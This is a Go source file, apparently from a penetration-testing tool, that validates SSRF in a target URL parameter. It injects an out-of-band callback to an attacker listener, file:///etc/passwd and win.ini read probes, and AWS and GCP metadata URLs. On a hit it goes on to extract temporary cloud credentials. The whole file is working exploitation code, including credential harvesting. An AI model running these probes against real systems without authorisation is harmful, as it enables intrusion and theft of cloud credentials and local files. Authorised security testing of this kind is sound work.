package validators

import (
	"context"
	"fmt"
	"net/http"
	"strings"
	"time"
)

// SSRFOOB 是外带回连的接入面：工具层用 listener.Manager 实现它（起临时监听、
// 按超时查会话 Preview 是否含 token），validators 包保持纯函数。
type SSRFOOB struct {
	// Base 是回连 URL 前缀（不含 token），形如 http://<LHOST>:<LPORT>。
	// 空 = 无法外带（未配置出口解析/监听不可用），OOB 探针跳过。
	Base string
	// Note 是外带通道不可用时的说明（透传进结果 Note）。
	Note string
	// Wait 是 OOB 等待时长（<=0 用默认 8s）。
	Wait time.Duration
	// WaitOOB 阻塞等待回连命中：返回 true 表示有连接携带 token。工具层查
	// listener 会话 Preview 实现。
	WaitOOB func(token string, timeout time.Duration) bool
}

// RunSSRF 验证 SSRF 类，三组探针：
//  1. OOB 型——参数注入回连 URL（http://cb/<token>），目标侧发起请求即命中
//     （最可靠的执行级证据）；依赖外带通道可用。
//  2. 文件读取响应型——file:///etc/passwd 等探针，断言响应含强特征；有响应
//     回读即强信号。
//  3. 云元数据型——169.254.169.254 等探针，断言响应含 ami-/instance-id 特征。
//
// verdict：OOB 命中 → pass；响应强特征命中 → pass（note 注明类型）；
// 全未命中 → fail（不代表无 SSRF，只代表本组探针没打出来）。
func RunSSRF(ctx context.Context, client *http.Client, targetURL, param, token string, oob SSRFOOB) *Result {
	var probes []ProbeResult

	// 1) OOB 回连（最优先；命中即结束）
	if oob.Base != "" && oob.WaitOOB != nil {
		oobURL := oob.Base + "/" + token
		for _, u := range probeURLs(targetURL, param, []string{oobURL}) {
			_, _, _, _ = probeGet(ctx, client, u) // 触发注入（响应内容无所谓）
		}
		wait := oob.Wait
		if wait <= 0 {
			wait = 8 * time.Second
		}
		hit := oob.WaitOOB(token, wait)
		probes = append(probes, ProbeResult{
			Name: "oob_callback", Injected: oobURL, Hit: hit,
			Detail: verdictText(hit,
				"目标侧发起了对回连地址的请求（OOB 会话捕获到探针 token）——SSRF 执行级证据",
				fmt.Sprintf("等待 %s 内未见回连", wait.Truncate(time.Millisecond)),
			),
		})
		if hit {
			return joinProbes("ssrf", token, probes, "OOB 命中：带外执行级证据。")
		}
	}

	// 2) 文件读取响应型（SSRF-with-response 最常见形态）
	type respProbe struct {
		name    string
		value   string
		signals []string
	}
	fileProbes := []respProbe{
		{"file_passwd", "file:///etc/passwd", []string{"root:x:0:0", "root:x:0"}},
		{"file_win", "file:///c:/windows/win.ini", []string{"[fonts]", "[extensions]"}},
	}
	for _, fp := range fileProbes {
		for _, u := range probeURLs(targetURL, param, []string{fp.value}) {
			body, _, _, err := probeGet(ctx, client, u)
			hit := err == nil && containsAny(body, fp.signals)
			probes = append(probes, ProbeResult{
				Name: fp.name, Injected: fp.value, Hit: hit,
				Detail: verdictText(hit,
					"响应含读取内容强特征（"+firstHit(body, fp.signals)+"）——SSRF 读文件确认",
					"响应无文件内容特征",
				),
			})
			if hit {
				return joinProbes("ssrf", token, probes, "响应回读型命中：目标把内网/本地资源内容带回了响应。")
			}
		}
	}

	// 3) 云元数据型
	metaProbes := []respProbe{
		{"meta_aws", "http://169.254.169.254/latest/meta-data/", []string{"ami-", "instance-id", "iam/security-credentials"}},
		{"meta_gcp", "http://metadata.google.internal/computeMetadata/v1/", []string{"computeMetadata", "instance"}},
	}
	var creds []CloudCredentials
	for _, mp := range metaProbes {
		for _, u := range probeURLs(targetURL, param, []string{mp.value}) {
			body, _, _, err := probeGet(ctx, client, u)
			hit := err == nil && containsAny(body, mp.signals)
			probes = append(probes, ProbeResult{
				Name: mp.name, Injected: mp.value, Hit: hit,
				Detail: verdictText(hit,
					"响应含云元数据特征——SSRF 打到云元数据服务",
					"响应无元数据特征",
				),
			})
			if hit {
				// 云元数据凭据深取（v0.4.93 能力域 #11）：提取临时凭据作为强证据。
				creds = ProbeCloudMeta(ctx, client, mp.value, mapName(mp.name))
				if len(creds) > 0 {
					r := joinProbes("ssrf", token, probes, "云元数据命中且提取到凭据（见 credentials 字段）。")
					r.Credentials = creds
					return r
				}
				return joinProbes("ssrf", token, probes, "云元数据命中：按云凭据泄露路径评估影响（凭据深取未成功，可手动跑完整 SSRF 载荷）。")
			}
		}
	}
	note := ""
	if oob.Note != "" {
		note = oob.Note
	}
	return joinProbes("ssrf", token, probes, note)
}

// mapName 把探针名映射到云厂商（凭据深取入口用）。
func mapName(probeName string) string {
	if strings.HasPrefix(probeName, "meta_gcp") {
		return "gcp"
	}
	return "aws"
}

// containsAny 判断响应是否含任一强特征。
func containsAny(body string, signals []string) bool {
	for _, s := range signals {
		if s != "" && stringsContains(body, s) {
			return true
		}
	}
	return false
}

// firstHit 返回首个命中的特征串（给结论文案用）。
func firstHit(body string, signals []string) string {
	for _, s := range signals {
		if s != "" && stringsContains(body, s) {
			return s
		}
	}
	return ""
}
